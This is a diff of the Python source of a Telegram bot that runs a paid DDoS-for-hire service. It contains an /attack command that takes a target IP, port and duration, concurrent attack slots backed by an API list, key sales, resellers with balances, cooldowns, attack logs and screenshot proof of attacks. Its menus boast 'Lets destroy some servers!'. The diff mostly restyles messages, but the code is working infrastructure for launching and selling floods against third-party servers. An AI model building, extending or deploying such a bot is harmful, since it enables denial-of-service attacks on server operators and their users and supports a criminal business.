-            bot.reply_to(message, f"Pehle attack ka screenshot bhejo!\nTarget: {fb['target']}:{fb['port']} Duration: {fb['duration']}s")
+            bot.reply_to(message, f"Pehle attack ka screenshot bhejo!\nTarget: {fb['target']} {fb['port']} Duration: {fb['duration']}s")
             return
         cooldown = get_user_cooldown(user_id, is_group)
         if cooldown > 0:
@@ -2374,18 +2199,15 @@ def handle_attack(message):
         if user_has_active_attack(user_id):
             bot.reply_to(message, "Tumhara pehle se ek attack chal raha hai!")
             return
-
     active_count = get_active_attack_count()
     max_concurrent = len(API_LIST)
     if active_count >= max_concurrent:
         bot.reply_to(message, f"Abhi chudai lgi hui hai! ({active_count}/{max_concurrent})\n\n/status se check kro")
         return
-
     command_parts = message.text.split()
     if len(command_parts) != 4:
         bot.reply_to(message, "Usage: /attack <ip> <port> <time>")
         return
-
     target, port, duration = command_parts[1], command_parts[2], command_parts[3]
     if not validate_target(target):
         bot.reply_to(message, "Invalid IP!")
@@ -2419,15 +2241,7 @@ def handle_attack(message):
                 user_attack_history[user_id] = {}
             user_attack_history[user_id][f"{target}:{port}"] = datetime.now()
             api_in_use[attack_id] = api_index
-            active_attacks[attack_id] = {
-                'target': target,
-                'port': port,
-                'duration': duration,
-                'user_id': user_id,
-                'start_time': datetime.now(),
-                'end_time': datetime.now() + timedelta(seconds=duration),
-                'is_group': is_group
-            }
+            active_attacks[attack_id] = {'target': target, 'port': port, 'duration': duration, 'user_id': user_id, 'start_time': datetime.now(), 'end_time': datetime.now() + timedelta(seconds=duration), 'is_group': is_group}
         thread = threading.Thread(target=start_attack, args=(target, port, duration, message, attack_id, api_index, is_group))
         thread.start()
     except ValueError:
@@ -2439,49 +2253,140 @@ def show_help(message):
     if check_banned(message): return
     user_id = message.from_user.id
     if is_owner(user_id):
-        help_text = f'''
-OWNER PANEL
+        help_text = f'''👑 OWNER PANEL
 
-KEY MGMT: /gen, /key, /allkeys, /delkey, /delete_key, /del_exp_key, /trail (or /trial), /reseller_trail (or /reseller_trial), /del_trail
-USER MGMT: /user, /allusers, /extend, /extend_all, /down, /del_exp_usr, /ban, /unban, /banned, /tban
-RESELLER: /add_reseller, /remove_reseller, /block_reseller, /unblock_reseller, /all_resellers, /saldo_add, /saldo_remove, /saldo, /user_resell, /setprice
-BROADCAST: /broadcast, /broadcast_reseller, /broadcast_paid
-ATTACK: /attack, /status, /settings, /private_max, /group_max, /private_cooldown, /group_cooldown
-PROTECTION: /ddos_on, /ddos_off, /required_on, /required_off
-GROUP: /addgrp, /removegrp, /groups, /channels
-REEL: /reel_on, /reel_off, /addreel, /removereel, /listreels
-SETUP: /setcanary, /setios, /setandroid, /setupstatus, /delsetup
-FEEDBACK: /feedback_on, /feedback_off
-MONITOR: /live, /logs, /del_logs
-MAINTENANCE: /maintenance, /ok
+🔑 KEY MGMT
+• /gen — Generate keys
+• /key — Key details
+• /allkeys — All keys list
+• /delkey /delete_key — Delete key
+• /del_exp_key — Delete expired keys
+• /trail (or /trial) — Trail key
+• /reseller_trail (or /reseller_trial) — Trail to resellers
+• /del_trail — Delete all trail keys
 
-Max Concurrent Attacks: {len(API_LIST)}
-'''
+👥 USER MGMT
+• /user — User info
+• /allusers — All users list
+• /extend — Extend user time
+• /extend_all — Extend all users
+• /down — Reduce user time
+• /del_exp_usr — Delete expired users
+• /ban — Permanent ban
+• /tban — Temporary ban
+• /unban — Remove ban
+• /banned — Banned users list
+
+💼 RESELLER
+• /add_reseller — Add reseller
+• /remove_reseller — Remove reseller
+• /block_reseller — Block reseller
+• /unblock_reseller — Unblock reseller
+• /all_resellers — All resellers
+• /saldo_add — Add balance
+• /saldo_remove — Remove balance
+• /saldo — Check balance
+• /user_resell — Reseller's users
+• /setprice — Change prices
+
+📢 BROADCAST
+• /broadcast — All users
+• /broadcast_reseller — Resellers only
+• /broadcast_paid — Paid users only
+
+⚡ ATTACK
+• /attack — Start attack
+• /status — Live attacks
+• /settings — Bot settings
+• /private_max — Set private max time
+• /group_max — Set group max time
+• /private_cooldown — Set private cooldown
+• /group_cooldown — Set group cooldown
+
+🛡️ PROTECTION
+• /ddos_on /ddos_off — DDoS protection
+• /required_on /required_off — Channel requirement
+• /block_ip — Block IP prefix
+• /unblock_ip — Unblock IP
+• /blocked_ips — List blocked IPs
+
+📢 GROUP
+• /addgrp — Approve group
+• /removegrp — Remove group
+• /groups — List approved groups
+• /channels — Channel info
+
+🎬 REEL
+• /reel_on /reel_off — Toggle reel
+• /addreel — Add reel
+• /removereel — Remove reel
+• /listreels — List reels
+
+⚙️ SETUP
+• /setcanary /setios /setandroid — Set files
+• /setupstatus — Setup status
+• /delsetup — Delete setup
+
+📸 FEEDBACK
+• /feedback_on /feedback_off
+
+📊 MONITOR
+• /live — Server stats
+• /logs — Attack logs
+• /del_logs — Delete logs
+
+🔧 MAINTENANCE
+• /maintenance — Turn ON
+• /ok — Turn OFF
+
+━━━━━━━━━━━━━━━━━━
+🔢 Max Concurrent: {len(API_LIST)}'''
     elif is_reseller(user_id):
-        help_text = f'''
-RESELLER PANEL
+        help_text = f'''💼 RESELLER PANEL
 
-ID: /id, /ping
-BALANCE: /mysaldo, /prices
-KEY GEN: /gen <duration> <count>
-ATTACK: /redeem, /attack, /status, /mykey
-Max Concurrent Attacks: {len(API_LIST)}
-'''
+🆔 BASIC
+• /id — Your ID
+• /ping — Bot status
+
+💰 BALANCE
+• /mysaldo — Check balance
+• /prices — Key prices
+
+🔑 KEY GEN
+• /gen <duration> <count> — Generate keys
+  Example: /gen 1d 5
+
+⚡ ATTACK
+• /redeem — Redeem key
+• /attack — Start attack
+• /status — Live attacks
+• /mykey — Your key
+
+━━━━━━━━━━━━━━━━━━
+🔢 Max Concurrent: {len(API_LIST)}'''
     else:
-        help_text = '''CMDS
-- /attack
-- /status
-- /mykey
-- /redeem
-- /verify
-- /id
+        help_text = '''╭━━━〔 💎 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 ━━╮
+┃
+┃  ◈  ⚡  /attack
+┃  ◈  📊  /status
+┃  ◈  📦  /mykey
+┃  ◈  🔑  /redeem
+┃  ◈  ✅  /verify
+┃  ◈  🆔  /id
+┃
+╰━━━━━━━━━━━━━━╯
 
-SETUP
-- /canary
-- /ios
-- /android
+╭━━━━━━〔 ⚙️ 𝗦𝗘𝗧𝗨𝗣 〕━━━━╮
+┃
+┃  ◈  📦  /canary
+┃  ◈  🍎  /ios
+┃  ◈  🤖  /android
+┃
+╰━━━━━━━━━━━━━━━━━━╯
 
-Lets destroy some servers!'''
+╭━━━━━〔 👑 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 〕━━━━╮
+┃  𝗙𝗔𝗦𝗧  •  💎 𝗣𝗥𝗢 • 𝗦𝗘𝗖𝗨𝗥𝗘
+╰━━━━━━━━━━━━━━━━ ━━━╯'''
     bot.reply_to(message, help_text)
 
 @bot.message_handler(commands=["del_trail"])
@@ -2606,7 +2511,7 @@ def user_info_command(message):
     reseller = resellers_collection.find_one({'user_id': target_user_id})
     bot_user = bot_users_collection.find_one({'user_id': target_user_id})
     response = "USER INFO\n=========\n\n"
-    response += f"ID: {target_user_id}\n"
+    response += f"ID: <code>{target_user_id}</code>\n"
     if resolved_name:
         response += f"Username: @{resolved_name}\n"
     if bot_user:
@@ -2625,7 +2530,7 @@ def user_info_command(message):
         if user.get('banned'):
             response += "STATUS: BANNED\n"
         if user.get('key'):
-            response += f"Key: {user['key']}\nDuration: {user.get('key_duration_label', 'N/A')}\n"
+            response += f"Key: <code>{user['key']}</code>\nDuration: {user.get('key_duration_label', 'N/A')}\n"
             if user.get('redeemed_at'):
                 response += f"Redeemed: {user['redeemed_at'].strftime('%d-%m-%Y %H:%M')}\n"
             if user.get('key_expiry'):
@@ -2658,14 +2563,14 @@ def user_info_command(message):
     if user_attacks:
         response += "\nRecent Attacks:\n"
         for i, atk in enumerate(user_attacks[:5], 1):
-            response += f"{i}. {atk['target']}:{atk['port']} ({atk['duration']}s)\n"
+            response += f"{i}. {atk['target']} {atk['port']} ({atk['duration']}s)\n"
             if atk.get('timestamp'):
                 response += f"   {atk['timestamp'].strftime('%d-%m-%Y %H:%M')}\n"
     fb = get_pending_feedback(target_user_id)
     if fb:
         response += "\nPending Feedback: YES\n"
     response += "\n========="
-    bot.reply_to(message, response)
+    bot.reply_to(message, response, parse_mode="HTML")
 
 @bot.message_handler(commands=["live"])
 def live_stats_command(message):
@@ -2761,7 +2666,7 @@ def attack_logs_command(message):
     content = "ATTACK LOGS REPORT\n"
     content += f"Generated: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n\nTotal Attacks: {len(all_logs)}\n\n--------------------\n"
     for i, log in enumerate(all_logs, 1):
-        content += f"{i}. {log.get('username', 'Unknown')} ({log.get('user_id', 'N/A')})\n   Target: {log.get('target', 'N/A')}:{log.get('port', 'N/A')}\n   Duration: {log.get('duration', 'N/A')}s\n"
+        content += f"{i}. {log.get('username', 'Unknown')} ({log.get('user_id', 'N/A')})\n   Target: {log.get('target', 'N/A')} {log.get('port', 'N/A')}\n   Duration: {log.get('duration', 'N/A')}s\n"
         if log.get('timestamp'):
             content += f"   Time: {log['timestamp'].strftime('%d-%m-%Y %H:%M:%S')}\n"
         content += "\n"
@@ -2857,47 +2762,61 @@ def welcome_start(message):
     track_bot_user(user_id, message.from_user.username)
     if check_maintenance(message): return
     if check_banned(message): return
-
     if is_owner(user_id):
-        response = f'''Welcome Owner, {user_name}!
+        response = f'''👑 Welcome Owner, {user_name}!
 
-DDoS: {'ON' if get_ddos_protection() else 'OFF'}
-Channel: {'REQUIRED' if get_channel_required() else 'NOT REQUIRED'}
-Groups: {len(get_approved_groups())}
-Max Slots: {len(API_LIST)}
-Reel: {'ON' if get_reel_enabled() else 'OFF'} ({len(get_reel_list())} reels)
-Feedback: {'ON' if get_feedback_enabled() else 'OFF'}
-Setup: /setupstatus
+🛡️ DDoS: {'ON' if get_ddos_protection() else 'OFF'}
+📢 Channel: {'✅ REQUIRED' if get_channel_required() else '❌ NOT REQUIRED'}
+📢 Groups: {len(get_approved_groups())}
+🔢 Max Slots: {len(API_LIST)}
+🎬 Reel: {'ON' if get_reel_enabled() else 'OFF'} ({len(get_reel_list())} reels)
+📸 Feedback: {'ON' if get_feedback_enabled() else 'OFF'}
+⚙️ Setup: /setupstatus
 
-Private: Max {get_private_max_attack_time()}s | CD {get_private_cooldown()}s
-Groups: Max {get_group_max_attack_time()}s | CD {get_group_cooldown()}s
+⚡ Private: Max {get_private_max_attack_time()}s | CD {get_private_cooldown()}s
+⚡ Groups: Max {get_group_max_attack_time()}s | CD {get_group_cooldown()}s
 
 Use /help for commands.
 Use /settings for settings.'''
     elif is_reseller(user_id):
-        response = f'''Welcome Reseller, {user_name}!
+        response = f'''💼 Welcome Reseller, {user_name}!
 
-Use /help to see commands.
-Max Slots: {len(API_LIST)}'''
+💰 Balance: /mysaldo
+🔑 Generate Keys: /gen <duration> <count>
+💵 Pricing: /prices
+⚡ Attack: /attack
+📊 Status: /status
+📦 My Key: /mykey
+🔑 Redeem: /redeem
+🆔 ID: /id
+🏓 Ping: /ping
+
+🔢 Max Slots: {len(API_LIST)}
+
+Use /help for full commands.'''
     else:
-        response = f'''Welcome to Premium Bot
+        response = '''╭━━━〔 💎 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 ━━╮
+┃
+┃  ◈  ⚡  /attack
+┃  ◈  📊  /status
+┃  ◈  📦  /mykey
+┃  ◈  🔑  /redeem
+┃  ◈  ✅  /verify
+┃  ◈  🆔  /id
+┃
+╰━━━━━━━━━━━━━━╯
 
-Powerful | Secure | Fast
+╭━━━━━━〔 ⚙️ 𝗦𝗘𝗧𝗨𝗣 〕━━━━╮
+┃
+┃  ◈  📦  /canary
+┃  ◈  🍎  /ios
+┃  ◈  🤖  /android
+┃
+╰━━━━━━━━━━━━━━━━━━╯
 
-CMDS
-- /attack
-- /status
-- /mykey
-- /redeem
-- /verify
-- /id
-
-SETUP
-- /canary
-- /ios
-- /android
-
-Lets destroy some servers!'''
+╭━━━━━〔 👑 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 〕━━━━╮
+┃  𝗙𝗔𝗦𝗧  •  💎 𝗣𝗥𝗢 • 𝗦𝗘𝗖𝗨𝗥𝗘
+╰━━━━━━━━━━━━━━━━ ━━━╯'''
     bot.reply_to(message, response)
 
 @bot.message_handler(content_types=['photo'])
@@ -2913,11 +2832,11 @@ def handle_feedback_photo(message):
     clear_pending_feedback(user_id)
     user_name = message.from_user.first_name
     username = message.from_user.username
-    bot.reply_to(message, f"Feedback Received!\nTarget: {fb['target']}:{fb['port']} Duration: {fb['duration']}s\n\nAb naya attack laga sakte ho!")
+    bot.reply_to(message, f"Feedback Received!\nTarget: {fb['target']} {fb['port']} Duration: {fb['duration']}s\n\nAb naya attack laga sakte ho!")
     try:
         photo = message.photo[-1]
         file_id = photo.file_id
-        owner_msg = f"New Feedback\nUser: {user_name}\n@{username if username else 'N/A'}\nID: {user_id}\nTarget: {fb['target']}:{fb['port']}\nDuration: {fb['duration']}s"
+        owner_msg = f"New Feedback\nUser: {user_name}\n@{username if username else 'N/A'}\nID: {user_id}\nTarget: {fb['target']} {fb['port']}\nDuration: {fb['duration']}s"
         bot.send_photo(BOT_OWNER, file_id, caption=owner_msg)
     except Exception as e:
         print(f"Feedback forward error: {e}")
@@ -2935,14 +2854,14 @@ def handle_other_feedback(message):
         if content_type == 'text':
             if message.text and message.text.startswith('/'):
                 return
-            bot.reply_to(message, f"Send screenshot (photo), not text!\nTarget: {fb['target']}:{fb['port']} Duration: {fb['duration']}s")
+            bot.reply_to(message, f"Send screenshot (photo), not text!\nTarget: {fb['target']} {fb['port']} Duration: {fb['duration']}s")
         else:
             clear_pending_feedback(user_id)
             user_name = message.from_user.first_name
             username = message.from_user.username
-            bot.reply_to(message, f"Feedback Received!\nTarget: {fb['target']}:{fb['port']} Duration: {fb['duration']}s\n\nAb naya attack laga sakte ho!")
+            bot.reply_to(message, f"Feedback Received!\nTarget: {fb['target']} {fb['port']} Duration: {fb['duration']}s\n\nAb naya attack laga sakte ho!")
             try:
-                owner_msg = f"New Feedback\nUser: {user_name}\n@{username if username else 'N/A'}\nID: {user_id}\nTarget: {fb['target']}:{fb['port']}\nDuration: {fb['duration']}s"
+                owner_msg = f"New Feedback\nUser: {user_name}\n@{username if username else 'N/A'}\nID: {user_id}\nTarget: {fb['target']} {fb['port']}\nDuration: {fb['duration']}s"
                 if content_type == 'document':
                     bot.send_document(BOT_OWNER, message.document.file_id, caption=owner_msg)
                 elif content_type == 'video':
@@ -3001,17 +2920,14 @@ def run_health_server():
     try:
         from http.server import HTTPServer, BaseHTTPRequestHandler
         port = int(os.getenv("PORT", "8080"))
-
         class HealthHandler(BaseHTTPRequestHandler):
             def do_GET(self):
                 self.send_response(200)
                 self.send_header('Content-Type', 'text/plain')
                 self.end_headers()
                 self.wfile.write(b"Bot is running!")
-
             def log_message(self, format, *args):
                 pass
-
         server = HTTPServer(('0.0.0.0', port), HealthHandler)
         print(f"Health check server started on port {port}", flush=True)
         server.serve_forever()
@@ -3031,7 +2947,6 @@ while True:
         error_str = str(e)
         retry_count += 1
         print(f"Polling crashed (attempt #{retry_count}): {e}", flush=True)
-
         if "409" in error_str or "Conflict" in error_str:
             print("409 Conflict detected! Removing webhook & waiting...", flush=True)
             try:
